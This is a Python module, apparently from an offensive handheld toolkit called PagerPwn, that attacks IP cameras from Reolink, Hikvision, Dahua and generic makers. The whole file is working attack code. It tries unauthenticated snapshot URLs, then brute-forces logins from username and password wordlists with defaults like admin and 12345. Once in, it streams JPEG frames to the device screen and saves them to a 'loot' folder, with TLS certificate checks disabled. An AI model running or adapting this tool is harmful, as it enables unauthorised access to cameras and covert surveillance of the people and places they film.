"""
cam_snap.py - Multi-manufacturer Camera Snapshot Viewer for PagerPwn

Grabs JPEG snapshots from IP cameras (Reolink, Hikvision, Dahua, Generic)
and displays them full-screen on the pager LCD (480x222). Auto-refreshes
every few seconds while open; press any button to dismiss.

Uses CAM_MFG from config (set by cam_probe) to pick the right snapshot
driver without re-fingerprinting.

Module interface: run(config, ui_callback, stop_event, pager=None) -> dict
"""

import os
import ssl
import json
import time
import socket
import base64
import urllib.request
import urllib.error
from datetime import datetime

SNAP_PATH = "/tmp/cam_snap.jpg"
REFRESH_INTERVAL = 3
SAVE_EVERY_N = 10  # save every Nth frame to loot

HTTPS_PORT = 443
HTTP_PORT = 80
TIMEOUT = 2

# Manufacturer constants (match cam_probe.py)
MFG_REOLINK = "reolink"
MFG_HIKVISION = "hikvision"
MFG_DAHUA = "dahua"
MFG_GENERIC = "generic"

# ── Wordlist loader ──────────────────────────────────────────────────────────
_BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WL_DIR = os.path.join(_BASE, "wordlists")


def _load_wordlist(filename):
    path = os.path.join(_WL_DIR, filename)
    if not os.path.isfile(path):
        return []
    with open(path) as f:
        return [line.rstrip("\n\r") for line in f]

# Skip cert verification for self-signed camera certs
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


# ── Reolink snapshot (token-based) ───────────────────────────────────────────


def _reolink_login(ip, user, password):
    """Login to Reolink HTTPS API, return session token or None."""
    body = json.dumps([{
        "cmd": "Login",
        "action": 0,
        "param": {
            "User": {
                "userName": user,
                "password": password,
            }
        }
    }]).encode()

    try:
        req = urllib.request.Request(
            f"https://{ip}/api.cgi?cmd=Login",
            data=body,
            headers={"Content-Type": "application/json"},
        )
        resp = urllib.request.urlopen(req, timeout=TIMEOUT, context=_SSL_CTX)
        text = resp.read().decode(errors="replace")

        data = json.loads(text)
        if isinstance(data, list):
            data = data[0]
        return data.get("value", {}).get("Token", {}).get("name")
    except Exception:
        return None


def _reolink_snapshot(ip, token=None):
    """Download a JPEG snapshot from Reolink. Returns raw bytes or None."""
    for path in ["/cgi-bin/api.cgi", "/api.cgi"]:
        try:
            url = f"https://{ip}{path}?cmd=Snap&channel=0"
            if token:
                url += f"&token={token}"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
            data = resp.read()
            if data and data[:2] == b"\xff\xd8":
                return data
        except Exception:
            continue
    return None


# ── Digest/Basic snapshot (Hikvision, Dahua, Generic) ────────────────────────


def _build_auth_opener(ip, port, user, password):
    """Build urllib opener with Digest + Basic auth handlers."""
    scheme = "https" if port == HTTPS_PORT else "http"
    base_url = f"{scheme}://{ip}:{port}/"

    pwd_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
    pwd_mgr.add_password(None, base_url, user, password)
    digest_handler = urllib.request.HTTPDigestAuthHandler(pwd_mgr)
    basic_handler = urllib.request.HTTPBasicAuthHandler(pwd_mgr)

    if port == HTTPS_PORT:
        https_handler = urllib.request.HTTPSHandler(context=_SSL_CTX)
        return urllib.request.build_opener(
            https_handler, digest_handler, basic_handler
        )
    return urllib.request.build_opener(digest_handler, basic_handler)


def _digest_snapshot(ip, user, password, paths):
    """Try Digest+Basic auth snapshot on given paths. Returns JPEG bytes or None."""
    for port in (HTTPS_PORT, HTTP_PORT):
        opener = _build_auth_opener(ip, port, user, password)
        scheme = "https" if port == HTTPS_PORT else "http"
        for path in paths:
            try:
                url = f"{scheme}://{ip}:{port}{path}"
                resp = opener.open(url, timeout=10)
                data = resp.read()
                if data and data[:2] == b"\xff\xd8":
                    return data
            except Exception:
                continue
    return None


def _basic_snapshot(ip, user, password, paths):
    """Try Basic auth snapshot on given paths. Returns JPEG bytes or None."""
    cred_b64 = base64.b64encode(f"{user}:{password}".encode()).decode()
    for port in (HTTPS_PORT, HTTP_PORT):
        scheme = "https" if port == HTTPS_PORT else "http"
        ctx = _SSL_CTX if port == HTTPS_PORT else None
        for path in paths:
            try:
                url = f"{scheme}://{ip}:{port}{path}"
                req = urllib.request.Request(url)
                req.add_header("Authorization", f"Basic {cred_b64}")
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                data = resp.read()
                if data and data[:2] == b"\xff\xd8":
                    return data
            except Exception:
                continue
    return None


# ── Snapshot paths per manufacturer ──────────────────────────────────────────

_HIKVISION_SNAP_PATHS = [
    "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/1/picture",
    "/Streaming/channels/101/picture",
]

_DAHUA_SNAP_PATHS = [
    "/cgi-bin/snapshot.cgi?channel=1",
    "/cgi-bin/snapshot.cgi",
]

_GENERIC_SNAP_PATHS = [
    "/snap.jpg",
    "/image.jpg",
    "/capture",
    "/jpg/image.jpg",
    "/onvif/snapshot",
    "/cgi-bin/snapshot.cgi",
]


# ── Multi-manufacturer snapshot grab ─────────────────────────────────────────


def _grab_snapshot(ip, mfg, user, password, token=None):
    """
    Grab a JPEG snapshot using the right method for the manufacturer.
    Returns raw JPEG bytes or None.
    """
    if mfg == MFG_REOLINK:
        return _reolink_snapshot(ip, token)

    if mfg == MFG_HIKVISION:
        jpeg = _digest_snapshot(ip, user, password, _HIKVISION_SNAP_PATHS)
        if jpeg:
            return jpeg
        # Fall through to generic paths
        return _digest_snapshot(ip, user, password, _GENERIC_SNAP_PATHS)

    if mfg == MFG_DAHUA:
        jpeg = _digest_snapshot(ip, user, password, _DAHUA_SNAP_PATHS)
        if jpeg:
            return jpeg
        return _digest_snapshot(ip, user, password, _GENERIC_SNAP_PATHS)

    # Generic — try Basic auth on common paths
    return _basic_snapshot(ip, user, password, _GENERIC_SNAP_PATHS)


# ── Multi-manufacturer login ─────────────────────────────────────────────────


def _try_login(ip, mfg, user, password):
    """
    Attempt authentication. Returns (success, token_or_none).
    For Reolink: success=True means we got a token.
    For Digest/Basic cameras: success=True means snapshot grab works.
    """
    if mfg == MFG_REOLINK:
        token = _reolink_login(ip, user, password)
        return (token is not None), token

    # For Hikvision/Dahua/Generic, just try grabbing a snapshot as the auth test
    if mfg == MFG_HIKVISION:
        paths = _HIKVISION_SNAP_PATHS[:1]
    elif mfg == MFG_DAHUA:
        paths = _DAHUA_SNAP_PATHS[:1]
    else:
        paths = _GENERIC_SNAP_PATHS[:1]

    jpeg = _digest_snapshot(ip, user, password, paths)
    if jpeg:
        return True, None
    # Try basic too for generic
    if mfg == MFG_GENERIC:
        jpeg = _basic_snapshot(ip, user, password, paths)
        if jpeg:
            return True, None
    return False, None


# ── Main entry point ────────────────────────────────────────────────────────


def run(config, ui_callback, stop_event, pager=None):
    """
    Grab snapshots from camera and display on pager LCD.
    """
    target_ip = config.get("CAMERA_IP", "")
    mfg = config.get("CAM_MFG", MFG_GENERIC)
    stats = {"frames": 0, "errors": 0, "auth": "none"}

    if pager is None:
        ui_callback("[CAM SNAP]", "No pager ref")
        time.sleep(2)
        return stats

    mfg_label = mfg.upper()

    # ── Connectivity check ────────────────────────────────────────────────
    ui_callback("[CAM SNAP]", f"Connecting {target_ip}...")
    reachable = False
    for port in (HTTPS_PORT, HTTP_PORT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target_ip, port))
            s.close()
            reachable = True
            break
        except Exception:
            continue

    if not reachable:
        ui_callback("[CAM SNAP]", f"{target_ip} unreachable")
        time.sleep(2)
        return stats

    # ── Login ─────────────────────────────────────────────────────────────
    token = None
    used_cred = ""
    cam_user = ""
    cam_pass = ""

    # If camera probe already told us auth is open, skip brute-force
    if config.get("CAM_OPEN"):
        ui_callback(f"[CAM SNAP] {mfg_label}", "Camera open — no auth needed")
        time.sleep(0.5)
        used_cred = "none (open)"
    else:
        # Try no-auth snapshot first
        ui_callback(f"[CAM SNAP] {mfg_label}", "Trying no-auth snapshot...")
        test_jpeg = _grab_snapshot(target_ip, mfg, "", "", None)
        if test_jpeg:
            ui_callback("[CAM SNAP]", "No auth needed!")
            used_cred = "none (open)"
            time.sleep(0.3)
        else:
            # Need credentials — use stashed creds or brute-force
            cam_user = config.get("CAM_USER", "")
            cam_pass = config.get("CAM_PASS", "")
            if cam_user and cam_pass:
                cred_list = [(cam_user, cam_pass)]
            else:
                users = _load_wordlist("usernames.txt") or ["admin", "root"]
                passwords = _load_wordlist("passwords.txt") or ["", "admin", "12345"]
                cred_list = [(u, p) for u in users for p in passwords]

            total = len(cred_list)
            ui_callback(f"[CAM SNAP] {mfg_label}", f"Trying {total} creds...")
            for idx, (user, pw) in enumerate(cred_list, 1):
                if stop_event and stop_event.is_set():
                    break
                cred_str = f"{user}:{pw}" if pw else f"{user}:(blank)"
                ui_callback(f"[CAM SNAP] {idx}/{total}", f"Trying {cred_str}")
                success, tok = _try_login(target_ip, mfg, user, pw)
                if success:
                    token = tok
                    cam_user = user
                    cam_pass = pw
                    used_cred = cred_str
                    ui_callback("[CAM SNAP] AUTH OK!", f"Cred: {cred_str}")
                    break

            if stop_event and stop_event.is_set():
                return stats
            if not used_cred:
                ui_callback("[CAM SNAP]", "Login failed")
                time.sleep(2)
                return stats

            if token:
                ui_callback("[CAM SNAP]", f"Token: {token[:12]}...")

    # ── Grab first frame ──────────────────────────────────────────────────
    ui_callback("[CAM SNAP]", "Grabbing snapshot...")
    jpeg = _grab_snapshot(target_ip, mfg, cam_user, cam_pass, token)
    stats["auth"] = used_cred

    if not jpeg:
        ui_callback("[CAM SNAP]", "Could not get snapshot")
        time.sleep(2)
        return stats

    # ── Loot setup ────────────────────────────────────────────────────────
    loot_dir = config.get("LOOT_DIR", "/mmc/root/loot/pagerpwn")
    snap_loot_dir = os.path.join(loot_dir, "snapshots")
    os.makedirs(snap_loot_dir, exist_ok=True)

    def _save_to_loot(jpeg_data, frame_num):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"snap_{target_ip}_{ts}_f{frame_num}.jpg"
        try:
            with open(os.path.join(snap_loot_dir, fname), "wb") as lf:
                lf.write(jpeg_data)
            stats["saved"] = stats.get("saved", 0) + 1
        except Exception:
            pass

    # ── Display loop ──────────────────────────────────────────────────────
    with open(SNAP_PATH, "wb") as f:
        f.write(jpeg)
    stats["frames"] = 1
    _save_to_loot(jpeg, 1)  # always save first frame

    pager.clear(0x0000)
    pager.draw_image_file_scaled(0, 0, 480, 222, SNAP_PATH)
    pager.fill_rect(0, 0, 480, 14, 0x0000)
    pager.draw_text(2, 1, f"CAM {target_ip}  [ANY BTN = EXIT]", pager.GREEN, 1)
    pager.flip()

    pager.clear_input_events()
    last_grab = time.time()
    _prev_buttons = 0

    while not (stop_event and stop_event.is_set()):
        buttons = pager.peek_buttons()
        if buttons and not _prev_buttons:
            break
        _prev_buttons = buttons

        now = time.time()
        if now - last_grab >= REFRESH_INTERVAL:
            new_jpeg = _grab_snapshot(target_ip, mfg, cam_user, cam_pass, token)
            if new_jpeg:
                with open(SNAP_PATH, "wb") as f:
                    f.write(new_jpeg)
                stats["frames"] += 1

                if stats["frames"] % SAVE_EVERY_N == 0:
                    _save_to_loot(new_jpeg, stats["frames"])

                saved = stats.get("saved", 0)
                pager.clear(0x0000)
                pager.draw_image_file_scaled(0, 0, 480, 222, SNAP_PATH)
                pager.fill_rect(0, 0, 480, 14, 0x0000)
                pager.draw_text(
                    2, 1,
                    f"LIVE f:{stats['frames']} s:{saved}  [ANY BTN = EXIT]",
                    pager.GREEN, 1,
                )
                pager.flip()
            else:
                stats["errors"] += 1

            last_grab = now

        time.sleep(0.05)

    # Save last frame on exit too
    try:
        with open(SNAP_PATH, "rb") as f:
            last_jpeg = f.read()
        if last_jpeg:
            _save_to_loot(last_jpeg, stats["frames"])
    except Exception:
        pass

    try:
        os.remove(SNAP_PATH)
    except Exception:
        pass

    saved = stats.get("saved", 0)
    ui_callback("[CAM SNAP] DONE", f"{stats['frames']} frames, {saved} saved")
    time.sleep(1)
    return stats
